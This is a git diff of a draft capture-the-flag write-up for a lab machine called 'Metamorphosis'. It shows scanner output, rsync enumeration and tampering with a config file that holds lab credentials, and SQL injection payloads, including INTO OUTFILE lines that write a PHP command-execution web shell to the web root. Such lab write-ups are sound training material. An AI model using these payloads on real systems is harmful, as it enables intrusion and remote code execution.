@@ -25,7 +25,32 @@ Like my work, Follow on twitter to be updated and know more about my work! (@0ci
 >> <strong><code>______</code></strong><br>
 <p></p>
 
-<br>
+
+
+```bash
+:~# nikto -h 10.201.70.130
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.201.70.130
++ Target Hostname:    10.201.70.130
++ Target Port:        80
++ Start Time:         2025-10-07 21:12:36 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.41 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ /admin/config.php: PHP Config file may contain database IDs and passwords.
++ OSVDB-3092: /admin/: This might be interesting...
++ OSVDB-3093: /admin/index.php: This might be interesting... has been seen in web logs from an unknown scanner.
++ 6544 items checked: 0 error(s) and 4 item(s) reported on remote host
++ End Time:           2025-10-07 21:12:43 (GMT1) (7 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+```
+
+
+
+
 
 <h1  align="center">Port Scanning<a id='2'></h1>
 
@@ -35,51 +60,27 @@ Like my work, Follow on twitter to be updated and know more about my work! (@0ci
 |-------------------:|:---------------------|:--------------------------------|
 | `22`               |`SSH`                 |OpenSSH 7.6p1 Ubuntu 4ubuntu0.3  |
 | `80`               |`HTTP`                |Apache httpd 2.4.41              |
-| `139`              |              |          | 
-| `445`              |               |              | 
-| `873`              |                |             | 
+| `139`              |                      |Microsoft Windows netbios-ssn    | 
+| `445`              |                      |                                 | 
+| `873`              |                      |rsync                            | 
 
 </p></div><br>
 
 
-
 ```bash
-:~/Metamorphosis# nmap -sC -sV -Pn -p- -T4 xx.xxx.xxx.xx
+:~/Metamorphosis# nmap -A -vv 10.201.70.130
 ...
-PORT    STATE SERVICE     VERSION
-22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+PORT    STATE SERVICE     REASON         VERSION
+22/tcp  open  ssh         syn-ack ttl 64 OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        syn-ack ttl 64 Apache httpd 2.4.41 ((Ubuntu))
 |_http-server-header: Apache/2.4.41 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-139/tcp open  netbios-ssn Samba smbd 4.6.2
-445/tcp open  netbios-ssn Samba smbd 4.6.2
-873/tcp open  rsync       (protocol version 31)
-...
+139/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+445/tcp open  netbios-ssn syn-ack ttl 64 Samba smbd 4.6.2
+873/tcp open  rsync       syn-ack ttl 64 (protocol version 31)
+..
 Host script results:
-|_nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
-| smb2-security-mode: 
-|   2.02: 
-|_    Message signing enabled but not required
-| smb2-time: 
-|   date: 2025-10-07T18:24:34
-|_  start_date: N/A
-```
-
-```bash
-:~/Metamorphosis# rustscan -a 10.201.123.26 --ulimit 5500 -b 65535 -- -A -Pn
-...
-PORT    STATE SERVICE     REASON  VERSION
-22/tcp  open  ssh         syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
-80/tcp  open  http        syn-ack Apache httpd 2.4.41 ((Ubuntu))
-|_http-server-header: Apache/2.4.41 (Ubuntu)
-|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
-139/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
-445/tcp open  netbios-ssn syn-ack Samba smbd 4.6.2
-873/tcp open  rsync       syn-ack (protocol version 31)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Host script results:
-|_clock-skew: 0s
+|_clock-skew: -1s
 | nbstat: NetBIOS name: , NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
 | Names:
 |   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
@@ -95,20 +96,309 @@ Host script results:
 |_  00 00 00 00 00 00 00 00 00 00 00 00 00 00
 | p2p-conficker: 
 |   Checking for Conficker.C or higher...
-|   Check 1 (port 35810/tcp): CLEAN (Couldn't connect)
-|   Check 2 (port 14752/tcp): CLEAN (Couldn't connect)
-|   Check 3 (port 45155/udp): CLEAN (Failed to receive data)
-|   Check 4 (port 54881/udp): CLEAN (Failed to receive data)
+|   Check 1 (port 11034/tcp): CLEAN (Couldn't connect)
+|   Check 2 (port 51363/tcp): CLEAN (Couldn't connect)
+|   Check 3 (port 24304/udp): CLEAN (Failed to receive data)
+|   Check 4 (port 34541/udp): CLEAN (Failed to receive data)
 |_  0/4 checks are positive: Host is CLEAN or ports are blocked
 | smb2-security-mode: 
 |   2.02: 
 |_    Message signing enabled but not required
 | smb2-time: 
-|   date: 2025-10-07T18:26:09
+|   date: 2025-10-07T20:11:50
 |_  start_date: N/A
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.29 ms 10.201.70.130
 ```
 
 
+```bash
+:~# gobuster dir -u http://10.201.70.130/ -w /usr/share/dirb/wordlists/common.txt -t 50
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.201.70.130/
+[+] Method:                  GET
+[+] Threads:                 50
+[+] Wordlist:                /usr/share/dirb/wordlists/common.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess            (Status: 403) [Size: 278]
+/.hta                 (Status: 403) [Size: 278]
+/.htpasswd            (Status: 403) [Size: 278]
+/admin                (Status: 301) [Size: 314] [--> http://10.201.70.130/admin/]
+/index.php            (Status: 500) [Size: 0]
+/server-status        (Status: 403) [Size: 278]
+Progress: 4614 / 4615 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+```bash
+:~# dirsearch -u http://10.201.70.130 -i200,301,302,401
+
+  _|. _ _  _  _  _ _|_    v0.4.3.post1
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
+
+Output File: /root/reports/http_10.201.70.130/_25-10-07_21-16-44.txt
+
+Target: http://10.201.70.130/
+
+[21:16:44] Starting: 
+[21:16:52] 301 -  314B  - /admin  ->  http://10.201.70.130/admin/
+[21:16:52] 200 -  129B  - /admin/
+[21:16:52] 200 -    0B  - /admin/config.php
+[21:16:53] 200 -  129B  - /admin/index.php
+
+Task Completed
+```
+
+
+```bash
+:~/Metamorphosis# nc -nv 10.201.70.130 873
+Connection to 10.201.70.130 873 port [tcp/*] succeeded!
+@RSYNCD: 31.0
+@RSYNCD: 31.0
+#list
+Conf           	All Confs
+@RSYNCD: EXIT
+```
+
+<img width="1254" height="169" alt="image" src="https://github.com/user-attachments/assets/93ea17f2-777f-494e-adb0-3ce5fa2e3b69" />
+
+
+
+
+```bash
+:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf
+receiving incremental file list
+drwxrwxrwx          4,096 2021/04/10 21:03:08 .
+-rw-r--r--          4,620 2021/04/09 21:01:22 access.conf
+-rw-r--r--          1,341 2021/04/09 20:56:12 bluezone.ini
+-rw-r--r--          2,969 2021/04/09 21:02:24 debconf.conf
+-rw-r--r--            332 2021/04/09 21:01:38 ldap.conf
+-rw-r--r--         94,404 2021/04/09 21:21:57 lvm.conf
+-rw-r--r--          9,005 2021/04/09 20:58:40 mysql.ini
+-rw-r--r--         70,207 2021/04/09 20:56:56 php.ini
+-rw-r--r--            320 2021/04/09 21:03:16 ports.conf
+-rw-r--r--            589 2021/04/09 21:01:07 resolv.conf
+-rw-r--r--             29 2021/04/09 21:02:56 screen-cleanup.conf
+-rw-r--r--          9,542 2021/04/09 21:00:59 smb.conf
+-rw-rw-r--             72 2021/04/10 21:03:06 webapp.ini
+
+sent 20 bytes  received 379 bytes  798.00 bytes/sec
+total size is 193,430  speedup is 484.79
+```
+
+<img width="1246" height="372" alt="image" src="https://github.com/user-attachments/assets/256cf80a-3284-4974-92f8-189ddb18f24c" />
+
+
+```bash
+:~/Metamorphosis# mkdir Challenge
+
+
+:~/Metamorphosis# rsync -av rsync://10.201.70.130/Conf ./Challenge
+receiving incremental file list
+./
+access.conf
+bluezone.ini
+debconf.conf
+ldap.conf
+lvm.conf
+mysql.ini
+php.ini
+ports.conf
+resolv.conf
+screen-cleanup.conf
+smb.conf
+webapp.ini
+
+sent 255 bytes  received 194,360 bytes  389,230.00 bytes/sec
+total size is 193,430  speedup is 0.99
+```
+
+
+<img width="1248" height="369" alt="image" src="https://github.com/user-attachments/assets/660e548e-5b2b-46a6-ae54-826647ae5109" />
+
+
+```bash
+root@ip-10-201-43-110:~/Metamorphosis# cd Challenge
+root@ip-10-201-43-110:~/Metamorphosis/Challenge# ls
+access.conf  bluezone.ini  debconf.conf  ldap.conf  lvm.conf  mysql.ini  php.ini  ports.conf  resolv.conf  screen-cleanup.conf  smb.conf  webapp.ini
+root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
+[Web_App]
+env = prod
+user = tom
+password = theCat
+
+[Details]
+Local = No
+root@ip-10-201-43-110:~/Metamorphosis/Challenge# nano webapp.ini
+root@ip-10-201-43-110:~/Metamorphosis/Challenge# cat webapp.ini
+[Web_App]
+env = dev
+user = tom
+password = theCat
+
+[Details]
+Local = No
+```
+
+
+
+
+<img width="1244" height="401" alt="image" src="https://github.com/user-attachments/assets/db0a1065-cbbe-4717-98d1-adc0b6379e02" />
+
+
+
+```bash
+:~/Metamorphosis/Challenge# rsync -av webapp.ini rsync://10.201.70.130/Conf
+sending incremental file list
+webapp.ini
+
+sent 186 bytes  received 41 bytes  454.00 bytes/sec
+total size is 71  speedup is 0.31
+
+
+<img width="1246" height="178" alt="image" src="https://github.com/user-attachments/assets/7b554e6e-9784-4be0-9241-91609abbf030" />
+
+navigated to  10.201.70.130/admin/
+
+<img width="1273" height="320" alt="image" src="https://github.com/user-attachments/assets/f900dfd7-3c74-4bb2-aae3-d84f8d2f6a00" />
+
+Page source
+
+<img width="1275" height="177" alt="image" src="https://github.com/user-attachments/assets/8325f8ab-02bf-47f5-9774-e301579925e0" />
+
+
+10.201.70.130/admin/
+
+
+lili
+Submit Query
+
+<img width="1277" height="329" alt="image" src="https://github.com/user-attachments/assets/24cc67f8-b663-4d7d-8c0c-73b953c91e99" />
+
+10.201.70.130/admin/config.php
+
+<img width="1273" height="181" alt="image" src="https://github.com/user-attachments/assets/6f9bb743-4680-4ee1-bb61-8432e08e5e96" />
+
+
+
+10.201.70.130/admin/
+
+tom
+Submit Query
+
+
+<img width="1274" height="300" alt="image" src="https://github.com/user-attachments/assets/fcfe086f-b747-4ecd-8250-b4c0a5b025df" />
+
+
+Username Pasword
+tom thecat
+
+
+Inspect
+10.201.70.130/admin
+Refreshed
+
+
+<img width="1276" height="527" alt="image" src="https://github.com/user-attachments/assets/b08a08a5-86ba-4aef-bbc6-95580de3d9e1" />
+
+
+
+
+<img width="1279" height="510" alt="image" src="https://github.com/user-attachments/assets/98a0ada8-2693-46a8-938c-bbd4b41e2c63" />
+
+
+
+
+:~/Metamorphosis# python3
+Python 3.8.10 (default, Sep 11 2024, 16:02:53) 
+[GCC 9.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> print (("<? system($_GET['cmd]); ?>").encode('utf-8').hex())
+3c3f2073797374656d28245f4745545b27636d645d293b203f3e
+>>> 
+
+username=researcher" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/rev.php"-- -
+
+x3rz" UNION ALL SELECT NULL,0x3c3f7068702073797374656d28245f4745545b27636d64275d293b3f3e,NULL INTO OUTFILE "/var/www/html/revshell.php"-- -
+
+
+username=tom' OR '1'='1
+
+```bash
+:~/Metamorphosis# sqlmap -u http://10.201.70.130/admin/ --data "username=FUZZ" --level 5 -D db --tables
+...
+[22:16:52] [INFO] testing 'Oracle time-based blind - ORDER BY, GROUP BY clause (DBMS_PIPE.RECEIVE_MESSAGE)'
+it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
+```
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+```bash
+
+```
+
+
+
+
+
+
+:~/Metamorphosis# smbclient -L incognito.thm/ -U "" -N
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	print$          Disk      Printer Drivers
+	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
+SMB1 disabled -- no workgroup available
+
+
+:~/Metamorphosis# smbclient -U "" -N //incognito.thm/print$
+tree connect failed: NT_STATUS_ACCESS_DENIED
+
+
+
+
+:~/Metamorphosis# smbclient -U "" -N //incognito.thm/IPC$
+Try "help" to get a list of possible commands.
+smb: \> ls
+NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*
+smb: \> 
+
+
+
+<br>
+<br>
 
 ```bash
 :~/Metamorphosis# rsync -avzh rsync://10.201.123.26/Conf .
@@ -127,7 +417,6 @@ screen-cleanup.conf
 smb.conf
 webapp.ini
 ```
-
 
 <img width="1205" height="322" alt="image" src="https://github.com/user-attachments/assets/a45f9d98-94c9-4d8c-874c-a23ca35ad53d" />
 
@@ -151,62 +440,50 @@ password = theCat
 Local = No
 ```
 
-
-
-
-
-
-
-
-
-
-
-:~/Metamorphosis# smbmap -u 'guest' -p '' -H 10.201.123.26
-[+] Finding open SMB ports....
-[+] Guest SMB session established on 10.201.123.26...
-[+] IP: 10.201.123.26:445	Name: 10.201.123.26                                     
-	Disk                                                  	Permissions	Comment
-	----                                                  	-----------	-------
-	print$                                            	NO ACCESS	Printer Drivers
-	IPC$                                              	NO ACCESS	IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
-
-
-
-:~/Metamorphosis# smbclient -L 10.201.123.26 -N
-
-	Sharename       Type      Comment
-	---------       ----      -------
-	print$          Disk      Printer Drivers
-	IPC$            IPC       IPC Service (ip-10-201-123-26 server (Samba, Ubuntu))
-SMB1 disabled -- no workgroup available
-
-
-
-
-
-
-<h3>Dirsearch</h3>
+```bash
+:~/Metamorphosis# nano webapp.ini
+```
 
 ```bash
-:~/Metamorphosis# dirsearch -u http://10.201.104.23 -i200,301,302,401
+:~/Metamorphosis# cat webapp.ini
+[Web_App]
+env = dev
+user = tom
+password = theCat
 
-  _|. _ _  _  _  _ _|_    v0.4.3.post1
- (_||| _) (/_(_|| (_| )
-
-Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460
-
-Output File: /root/Metamorphosis/reports/http_10.201.104.23/_25-08-04_01-47-04.txt
-
-Target: http://10.201.104.23/
-
-[01:47:04] Starting: 
-[01:47:14] 301 -  314B  - /admin  ->  http://10.201.104.23/admin/
-[01:47:14] 200 -  129B  - /admin/
-[01:47:15] 200 -    0B  - /admin/config.php
-[01:47:15] 200 -  129B  - /admin/index.php
-
-Task Completed
+[Details]
+Local = No
 ```
+
+```bash
+:~/Metamorphosis# rsync -aPv webapp.ini rsync://10.201.123.26/Conf/webapp.ini
+sending incremental file list
+webapp.ini
+             71 100%    0.00kB/s    0:00:00 (xfr#1, to-chk=0/1)
+
+sent 186 bytes  received 41 bytes  454.00 bytes/sec
+total size is 71  speedup is 0.31
+```
+
+<p align="left">Navigated to <strong>/admin/index.php<br><img width="1200px" src="https://github.com/user-attachments/assets/91298f9f-bf31-4293-89ed-daea48e913ca"></p>
+
+<p align="left">Viewed page source. Identified action=config.php, method=POST, name:'username'.<img width="1200px" src="https://github.com/user-attachments/assets/98ea9d9a-5c2f-4a65-ade5-c457592c58a1"></p>
+
+<p align="left">Launched Burp Suite and enabled FoxyProxy.<br>Refreshed.<br><p><img width="1200px" src="https://github.com/user-attachments/assets/fbb9e7d1-fd7a-4cfd-9cbc-dd7fa6beef8e"></p>
+
+<p align="left">Submitted query<strong><ins>tom</ins></strong><br>Response containd <strong><ins>500 Internal Server Error</ins></strong><p> and redirected to <strong><ins>config.php</ins></strong>.<img width="1200px" src="https://github.com/user-attachments/assets/5bce8b58-cbe6-431e-b2ad-863b6505de47"></p>
+
+<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>
+
+<p align="left">Right-clicked Request > clicked <code>Save item</code> > entered a file name > clicked <code>Save</code>. Created <code>request.txt</code>.</p>
+
+< align="enter"><Executed <code>sqlmap</code>.</p>
+
+:~/Metamorphosis# sqlmap -r request.txt --level 5 --risk 3
+
+
+
+
 
 
 <h3>873/tcp open  rsync</h3>
